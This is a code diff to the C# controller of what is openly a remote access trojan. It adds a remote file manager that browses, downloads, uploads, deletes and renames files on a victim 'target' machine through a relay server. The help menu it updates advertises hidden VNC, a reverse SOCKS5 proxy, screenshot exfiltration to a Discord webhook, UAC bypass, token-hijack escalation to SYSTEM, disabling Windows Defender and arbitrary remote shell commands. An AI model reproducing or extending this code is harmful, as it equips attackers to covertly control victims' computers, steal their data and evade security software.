@@ -66,6 +66,433 @@ class StatsWindow : Form {
     }
 }
 
+class FileManagerWindow : Form {
+    private string target;
+    private string secret;
+    private ClientWebSocket? wsClient;
+    private string RELAY_SERVER = "ws://YOUR_RELAY_HOST:20113";
+    private TreeView treeView;
+    private ListView listView;
+    private TextBox pathBox;
+    private Label statusLabel;
+    private string currentPath = "";
+    private List<byte[]> downloadChunks = new List<byte[]>();
+    private int expectedChunks = 0;
+    
+    public FileManagerWindow(string t, string s) {
+        target = t; secret = s;
+        this.Text = $"File Manager - {target}";
+        this.Size = new Size(1000, 700);
+        this.BackColor = Color.FromArgb(20, 20, 20);
+        this.StartPosition = FormStartPosition.CenterScreen;
+        
+        // Path bar
+        pathBox = new TextBox {
+            Location = new Point(10, 10),
+            Size = new Size(880, 25),
+            BackColor = Color.FromArgb(40, 40, 40),
+            ForeColor = Color.White,
+            Font = new Font("Consolas", 10),
+            ReadOnly = false, // Allow editing
+            Text = "C:\\"
+        };
+        pathBox.KeyDown += (s, e) => {
+            if (e.KeyCode == Keys.Enter) {
+                LoadDirectory(pathBox.Text);
+                e.Handled = true;
+                e.SuppressKeyPress = true;
+            }
+        };
+        this.Controls.Add(pathBox);
+        
+        // Refresh button
+        Button refreshBtn = new Button {
+            Text = "↻",
+            Location = new Point(900, 10),
+            Size = new Size(80, 25),
+            BackColor = Color.FromArgb(0, 120, 215),
+            ForeColor = Color.White,
+            FlatStyle = FlatStyle.Flat
+        };
+        refreshBtn.Click += (s, e) => LoadDirectory(currentPath);
+        this.Controls.Add(refreshBtn);
+        
+        // TreeView (left side - drives)
+        treeView = new TreeView {
+            Location = new Point(10, 45),
+            Size = new Size(250, 550),
+            BackColor = Color.FromArgb(30, 30, 30),
+            ForeColor = Color.White,
+            BorderStyle = BorderStyle.FixedSingle
+        };
+        treeView.AfterSelect += TreeView_AfterSelect;
+        treeView.BeforeExpand += (s, e) => {
+            if (e.Node?.Nodes.Count == 1 && e.Node.Nodes[0].Text == "loading...") {
+                e.Node.Nodes.Clear();
+                string path = e.Node.Tag?.ToString() ?? "";
+                LoadDirectory(path);
+            }
+        };
+        this.Controls.Add(treeView);
+        
+        // ListView (right side - files)
+        listView = new ListView {
+            Location = new Point(270, 45),
+            Size = new Size(710, 550),
+            BackColor = Color.FromArgb(30, 30, 30),
+            ForeColor = Color.White,
+            View = View.Details,
+            FullRowSelect = true,
+            GridLines = true,
+            BorderStyle = BorderStyle.FixedSingle
+        };
+        listView.Columns.Add("Name", 300);
+        listView.Columns.Add("Type", 100);
+        listView.Columns.Add("Size", 120);
+        listView.Columns.Add("Modified", 180);
+        listView.MouseDoubleClick += ListView_DoubleClick;
+        listView.MouseClick += ListView_RightClick;
+        this.Controls.Add(listView);
+        
+        // Context menu for files
+        ContextMenuStrip contextMenu = new ContextMenuStrip();
+        contextMenu.Items.Add("Download", null, (s, e) => DownloadFile());
+        contextMenu.Items.Add("Delete", null, (s, e) => DeleteFile());
+        contextMenu.Items.Add("Rename", null, (s, e) => RenameFile());
+        listView.ContextMenuStrip = contextMenu;
+        
+        // Buttons
+        Button uploadBtn = new Button {
+            Text = "Upload File",
+            Location = new Point(10, 610),
+            Size = new Size(120, 35),
+            BackColor = Color.FromArgb(0, 120, 215),
+            ForeColor = Color.White,
+            FlatStyle = FlatStyle.Flat
+        };
+        uploadBtn.Click += (s, e) => UploadFile();
+        this.Controls.Add(uploadBtn);
+        
+        Button downloadBtn = new Button {
+            Text = "Download",
+            Location = new Point(140, 610),
+            Size = new Size(120, 35),
+            BackColor = Color.FromArgb(0, 150, 0),
+            ForeColor = Color.White,
+            FlatStyle = FlatStyle.Flat
+        };
+        downloadBtn.Click += (s, e) => DownloadFile();
+        this.Controls.Add(downloadBtn);
+        
+        Button deleteBtn = new Button {
+            Text = "Delete",
+            Location = new Point(270, 610),
+            Size = new Size(120, 35),
+            BackColor = Color.FromArgb(200, 0, 0),
+            ForeColor = Color.White,
+            FlatStyle = FlatStyle.Flat
+        };
+        deleteBtn.Click += (s, e) => DeleteFile();
+        this.Controls.Add(deleteBtn);
+        
+        // Status label
+        statusLabel = new Label {
+            Location = new Point(400, 615),
+            Size = new Size(580, 25),
+            ForeColor = Color.Cyan,
+            Font = new Font("Consolas", 9),
+            Text = "Ready"
+        };
+        this.Controls.Add(statusLabel);
+        
+        StartWebSocketConnection();
+    }
+    
+    private async void StartWebSocketConnection() {
+        try {
+            wsClient = new ClientWebSocket();
+            await wsClient.ConnectAsync(new Uri(RELAY_SERVER), CancellationToken.None);
+            
+            // Send init message
+            string controllerId = Guid.NewGuid().ToString();
+            string initMsg = $"{{\"id\":\"{controllerId}\",\"role\":\"controller\"}}";
+            await wsClient.SendAsync(
+                Encoding.UTF8.GetBytes(initMsg),
+                WebSocketMessageType.Text,
+                true,
+                CancellationToken.None
+            );
+            
+            // Wait for ACK from relay server
+            var buffer = new byte[4096];
+            var result = await wsClient.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
+            string ack = Encoding.UTF8.GetString(buffer, 0, result.Count);
+            // ACK received (or not) - proceed regardless
+            
+            statusLabel.Text = "Connected! Loading drives...";
+            
+            // Start background receiver
+            _ = Task.Run(async () => await ReceiveMessages());
+            
+            // Send LIST_DRIVES immediately
+            await SendFileCommand("LIST_DRIVES", "");
+            
+        } catch (Exception ex) {
+            statusLabel.Text = $"Connection error: {ex.Message}";
+        }
+    }
+    
+    private async Task ReceiveMessages() {
+        var buffer = new byte[10 * 1024 * 1024];
+        while (!this.IsDisposed && wsClient?.State == WebSocketState.Open) {
+            try {
+                var result = await wsClient.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
+                if (result.Count == 0) continue;
+                
+                if (result.MessageType == WebSocketMessageType.Text) {
+                    string message = Encoding.UTF8.GetString(buffer, 0, result.Count);
+                    // Skip relay ACK messages
+                    if (message.Contains("\"status\":\"connected\"") || 
+                        message.Contains("\"status\":\"session_created\"")) continue;
+                    ProcessFileResponse(message);
+                }
+                else if (result.MessageType == WebSocketMessageType.Binary) {
+                    ProcessFileDownload(buffer, result.Count);
+                }
+            } catch { break; }
+        }
+    }
+    
+    private void ProcessFileResponse(string json) {
+        try {
+            if (this.InvokeRequired) {
+                this.BeginInvoke(new Action(() => ProcessFileResponse(json)));
+                return;
+            }
+            
+            if (string.IsNullOrWhiteSpace(json)) return;
+            
+            // Parse JSON response using System.Text.Json
+            try {
+                var doc = System.Text.Json.JsonDocument.Parse(json);
+                var root = doc.RootElement;
+                
+                // Error response
+                if (root.TryGetProperty("status", out var statusProp) && statusProp.GetString() == "ERROR") {
+                    string msg = root.TryGetProperty("message", out var msgProp) ? msgProp.GetString() ?? "" : json;
+                    statusLabel.Text = $"Error: {msg}";
+                    return;
+                }
+                
+                // OK response - refresh
+                if (root.TryGetProperty("status", out var okProp) && okProp.GetString() == "OK") {
+                    statusLabel.Text = "Done.";
+                    LoadDirectory(currentPath);
+                    return;
+                }
+                
+                if (!root.TryGetProperty("cmd", out var cmdProp)) return;
+                string cmd = cmdProp.GetString() ?? "";
+                
+                // DRIVES response
+                if (cmd == "DRIVES") {
+                    treeView.Nodes.Clear();
+                    if (root.TryGetProperty("drives", out var drivesArr)) {
+                        foreach (var d in drivesArr.EnumerateArray()) {
+                            string driveName = d.GetString() ?? "";
+                            if (string.IsNullOrEmpty(driveName)) continue;
+                            TreeNode node = new TreeNode(driveName) { Tag = driveName };
+                            node.Nodes.Add("loading..."); // Dummy for expand arrow
+                            treeView.Nodes.Add(node);
+                        }
+                    }
+                    statusLabel.Text = $"Found {treeView.Nodes.Count} drives";
+                    return;
+                }
+                
+                // DIR response
+                if (cmd == "DIR") {
+                    listView.Items.Clear();
+                    if (root.TryGetProperty("items", out var itemsArr)) {
+                        foreach (var item in itemsArr.EnumerateArray()) {
+                            string name     = item.TryGetProperty("name",     out var n) ? n.GetString() ?? "" : "";
+                            string type     = item.TryGetProperty("type",     out var t) ? t.GetString() ?? "" : "";
+                            string size     = item.TryGetProperty("size",     out var s) ? s.GetString() ?? "" : "";
+                            string modified = item.TryGetProperty("modified", out var m) ? m.GetString() ?? "" : "";
+                            
+                            var lvi = new ListViewItem(name);
+                            lvi.SubItems.Add(type);
+                            lvi.SubItems.Add(size);
+                            lvi.SubItems.Add(modified);
+                            // Build full path
+                            string fullPath = currentPath.TrimEnd('\\') + "\\" + name;
+                            lvi.Tag = fullPath;
+                            // Color dirs differently
+                            if (type == "DIR") lvi.ForeColor = Color.Cyan;
+                            listView.Items.Add(lvi);
+                        }
+                    }
+                    statusLabel.Text = $"{listView.Items.Count} items in {currentPath}";
+                    return;
+                }
+                
+            } catch (Exception ex) {
+                statusLabel.Text = $"Parse error: {ex.Message}";
+            }
+        } catch (Exception ex) {
+            statusLabel.Text = $"Response error: {ex.Message}";
+        }
+    }
+    
+    private void ProcessFileDownload(byte[] buffer, int count) {
+        try {
+            if (this.InvokeRequired) {
+                this.BeginInvoke(new Action(() => ProcessFileDownload(buffer, count)));
+                return;
+            }
+            
+            // Save file dialog
+            SaveFileDialog sfd = new SaveFileDialog();
+            if (sfd.ShowDialog() == DialogResult.OK) {
+                File.WriteAllBytes(sfd.FileName, buffer.Take(count).ToArray());
+                statusLabel.Text = $"Downloaded: {sfd.FileName}";
+            }
+        } catch (Exception ex) {
+            statusLabel.Text = $"Download error: {ex.Message}";
+        }
+    }
+    
+    private async Task SendFileCommand(string cmd, string path, byte[]? data = null) {
+        if (wsClient?.State != WebSocketState.Open) return;
+        
+        try {
+            // Use JsonSerializer - handles all escaping automatically
+            string json = System.Text.Json.JsonSerializer.Serialize(new {
+                cmd       = cmd,
+                path      = path,
+                target_id = target
+            });
+            
+            await wsClient.SendAsync(
+                Encoding.UTF8.GetBytes(json),
+                WebSocketMessageType.Text,
+                true,
+                CancellationToken.None
+            );
+        } catch (Exception ex) {
+            if (this.InvokeRequired)
+                this.BeginInvoke(new Action(() => statusLabel.Text = $"Send error: {ex.Message}"));
+            else
+                statusLabel.Text = $"Send error: {ex.Message}";
+        }
+    }
+    
+    private void TreeView_AfterSelect(object? sender, TreeViewEventArgs e) {
+        if (e.Node?.Tag != null) {
+            string path = e.Node.Tag.ToString() ?? "";
+            LoadDirectory(path);
+        }
+    }
+    
+    private void ListView_DoubleClick(object? sender, MouseEventArgs e) {
+        if (listView.SelectedItems.Count > 0) {
+            var item = listView.SelectedItems[0];
+            if (item.SubItems[1].Text == "DIR") {
+                string path = item.Tag?.ToString() ?? "";
+                LoadDirectory(path);
+            }
+        }
+    }
+    
+    private void ListView_RightClick(object? sender, MouseEventArgs e) {
+        if (e.Button == MouseButtons.Right && listView.SelectedItems.Count > 0) {
+            listView.ContextMenuStrip?.Show(listView, e.Location);
+        }
+    }
+    
+    private async void LoadDirectory(string path) {
+        if (string.IsNullOrWhiteSpace(path)) return; // Never send empty path
+        currentPath = path;
+        pathBox.Text = path;
+        statusLabel.Text = $"Loading {path}...";
+        await SendFileCommand("LIST_DIR", path);
+    }
+    
+    private async void UploadFile() {
+        OpenFileDialog ofd = new OpenFileDialog();
+        if (ofd.ShowDialog() == DialogResult.OK) {
+            try {
+                byte[] fileData = File.ReadAllBytes(ofd.FileName);
+                string fileName = Path.GetFileName(ofd.FileName);
+                string targetPath = currentPath + "\\" + fileName;
+                
+                statusLabel.Text = $"Uploading {fileName}...";
+                
+                // Send upload command with file data
+                await SendFileCommand("UPLOAD", targetPath, fileData);
+                
+            } catch (Exception ex) {
+                statusLabel.Text = $"Upload error: {ex.Message}";
+            }
+        }
+    }
+    
+    private async void DownloadFile() {
+        if (listView.SelectedItems.Count > 0) {
+            var item = listView.SelectedItems[0];
+            if (item.SubItems[1].Text != "DIR") {
+                string path = item.Tag?.ToString() ?? "";
+                statusLabel.Text = $"Downloading {item.Text}...";
+                await SendFileCommand("DOWNLOAD", path);
+            }
+        }
+    }
+    
+    private async void DeleteFile() {
+        if (listView.SelectedItems.Count > 0) {
+            var item = listView.SelectedItems[0];
+            string path = item.Tag?.ToString() ?? "";
+            
+            var result = MessageBox.Show($"Delete {item.Text}?", "Confirm", MessageBoxButtons.YesNo);
+            if (result == DialogResult.Yes) {
+                statusLabel.Text = $"Deleting {item.Text}...";
+                await SendFileCommand("DELETE", path);
+            }
+        }
+    }
+    
+    private void RenameFile() {
+        if (listView.SelectedItems.Count > 0) {
+            var item = listView.SelectedItems[0];
+            string oldPath = item.Tag?.ToString() ?? "";
+            
+            // Simple input dialog
+            Form inputForm = new Form {
+                Width = 400,
+                Height = 150,
+                Text = "Rename",
+                StartPosition = FormStartPosition.CenterParent,
+                BackColor = Color.FromArgb(30, 30, 30)
+            };
+            Label label = new Label { Left = 10, Top = 20, Text = "New name:", ForeColor = Color.White, Width = 370 };
+            TextBox textBox = new TextBox { Left = 10, Top = 50, Width = 360, Text = item.Text, BackColor = Color.FromArgb(40, 40, 40), ForeColor = Color.White };
+            Button okButton = new Button { Text = "OK", Left = 200, Width = 80, Top = 80, DialogResult = DialogResult.OK, BackColor = Color.FromArgb(0, 120, 215), ForeColor = Color.White };
+            Button cancelButton = new Button { Text = "Cancel", Left = 290, Width = 80, Top = 80, DialogResult = DialogResult.Cancel, BackColor = Color.FromArgb(60, 60, 60), ForeColor = Color.White };
+            
+            inputForm.Controls.Add(label);
+            inputForm.Controls.Add(textBox);
+            inputForm.Controls.Add(okButton);
+            inputForm.Controls.Add(cancelButton);
+            inputForm.AcceptButton = okButton;
+            
+            if (inputForm.ShowDialog() == DialogResult.OK && !string.IsNullOrEmpty(textBox.Text)) {
+                string newPath = Path.Combine(Path.GetDirectoryName(oldPath) ?? "", textBox.Text);
+                _ = SendFileCommand("RENAME", $"{oldPath}|{newPath}");
+            }
+        }
+    }
+}
+
 class VncViewer : Form {
     private string target;
     private IMqttClient client;
@@ -73,8 +500,7 @@ class VncViewer : Form {
     public PictureBox pic = new PictureBox();
     private Panel kbPanel = new Panel();
     private ClientWebSocket? wsClient;
-    // ⚠️ IMPORTANT: Change this to your relay server address
-    private string RELAY_SERVER = "ws://YOUR_RELAY_SERVER_IP:20113"; // ⚠️ CHANGE THIS to your relay server (e.g., "ws://katabump.com:20113")
+    private string RELAY_SERVER = "ws://YOUR_RELAY_HOST:20113";
 
     public VncViewer(string t, string s, IMqttClient c) {
         target = t; secret = s; client = c;
@@ -426,9 +852,7 @@ class VncViewer : Form {
 
 class Controller
 {
-    // ⚠️ IMPORTANT: Change this to match your Executor's Secret ID
-    // This must be the SAME as the decrypted sk[] value in Executor/Program.cs
-    static string secretId = "YOUR_UNIQUE_SECRET_ID_HERE"; // ⚠️ CHANGE THIS to match Executor
+    static string secretId = "YOUR_SECRET_ID_HERE";
     static ConcurrentDictionary<string, MachineInfo> activeMachines = new ConcurrentDictionary<string, MachineInfo>();
     static string selectedMachine = "";
     static StatsWindow currentStatsWindow = null;
@@ -449,9 +873,8 @@ class Controller
         var mqttFactory = new MqttFactory();
         using (var mqttClient = mqttFactory.CreateMqttClient())
         {
-            // ⚠️ IMPORTANT: Change this to match your Executor's MQTT broker
-            var options = new MqttClientOptionsBuilder().WithTcpServer("YOUR_MQTT_BROKER_ADDRESS").Build(); // ⚠️ CHANGE THIS (e.g., "broker.hivemq.com")
-            Console.WriteLine("[*] Connecting to MQTT broker...");
+            var options = new MqttClientOptionsBuilder().WithTcpServer("YOUR_MQTT_BROKER_HERE").Build();
+            Console.WriteLine("[*] Connecting to configured MQTT broker...");
             
             mqttClient.ApplicationMessageReceivedAsync += e => {
                 string t = e.ApplicationMessage.Topic;
@@ -614,6 +1037,20 @@ class Controller
                 });
                 tVnc.SetApartmentState(ApartmentState.STA); tVnc.Start();
                 break;
+            case "/filesys":
+                if (string.IsNullOrEmpty(selectedMachine)) return;
+                
+                // Send trigger to Executor to start file WebSocket listener
+                await Send("/filesys", c);
+                
+                Console.WriteLine("[+] Sent File System trigger. Opening File Manager...");
+                Thread tFile = new Thread(() => { 
+                    Application.EnableVisualStyles(); 
+                    var win = new FileManagerWindow(selectedMachine, secretId);
+                    Application.Run(win); 
+                });
+                tFile.SetApartmentState(ApartmentState.STA); tFile.Start();
+                break;
         }
     }
 
@@ -733,33 +1170,48 @@ class Controller
         Console.ResetColor();
         
         Console.ForegroundColor = ConsoleColor.Cyan;
-        Console.WriteLine("\n► GENERAL COMMANDS:");
+        Console.WriteLine("\n► GENERAL:");
         Console.ResetColor();
-        Console.WriteLine("  mls                    - List available machines");
+        Console.WriteLine("  mls                    - List & select available machines");
         Console.WriteLine("  /help                  - Display this help menu");
         Console.WriteLine("  /clear                 - Clear the screen");
         Console.WriteLine("  /exit                  - Exit the application");
         
         Console.ForegroundColor = ConsoleColor.Cyan;
-        Console.WriteLine("\n► MACHINE INFORMATION:");
+        Console.WriteLine("\n► INFORMATION:");
         Console.ResetColor();
-        Console.WriteLine("  /info                  - Get system information");
-        Console.WriteLine("  /list                  - Get running processes");
-        Console.WriteLine("  /stats                 - Display live statistics (CPU, RAM, Network)");
-        Console.WriteLine("  /uacbypass             - Attempt to bypass UAC on the target machine (use with caution!)");
+        Console.WriteLine("  /info                  - Get full system information (systeminfo)");
+        Console.WriteLine("  /list                  - List running processes (tasklist)");
+        Console.WriteLine("  /stats                 - Live GUI stats (CPU, RAM, Network)");
         
         Console.ForegroundColor = ConsoleColor.Cyan;
-        Console.WriteLine("\n► REMOTE OPERATIONS:");
+        Console.WriteLine("\n► REMOTE CONTROL:");
         Console.ResetColor();
-        Console.WriteLine("  /screenshot            - Capture and upload screenshot to Discord");
+        Console.WriteLine("  /hvnc                  - Open hidden VNC viewer (1280x720 @ 20fps)");
+        Console.WriteLine("  /filesys               - Open File Manager (browse, upload, download, delete)");
+        Console.WriteLine("  /proxy                 - Start reverse SOCKS5 proxy on 127.0.0.1:1080");
+        Console.WriteLine("  /screenshot            - Capture screen → send to Discord Webhook");
         
         Console.ForegroundColor = ConsoleColor.Cyan;
-        Console.WriteLine("\n► STANDARD COMMANDS:");
+        Console.WriteLine("\n► PRIVILEGE ESCALATION:");
         Console.ResetColor();
-        Console.WriteLine("  Any other command will be executed on the target machine\n");
+        Console.WriteLine("  /uacbypass             - Stealth UAC bypass (computerdefaults hijack)");
+        Console.WriteLine("  /getsystem             - Escalate to SYSTEM (RedSun token hijack)");
+        
+        Console.ForegroundColor = ConsoleColor.Cyan;
+        Console.WriteLine("\n► DEFENSE EVASION:");
+        Console.ResetColor();
+        Console.WriteLine("  /freeze                - Freeze Windows Defender (UnDefend v2)");
+        
+        Console.ForegroundColor = ConsoleColor.Cyan;
+        Console.WriteLine("\n► SHELL:");
+        Console.ResetColor();
+        Console.WriteLine("  <any command>          - Execute shell command on target (cmd.exe)");
+        Console.WriteLine("  cd <path>              - Change directory on target");
+        Console.WriteLine();
         
         Console.ForegroundColor = ConsoleColor.Blue;
-        Console.WriteLine("═══════════════════════════════════════════════════────═\n");
+        Console.WriteLine("═══════════════════════════════════════════════════════\n");
         Console.ResetColor();
     }
     
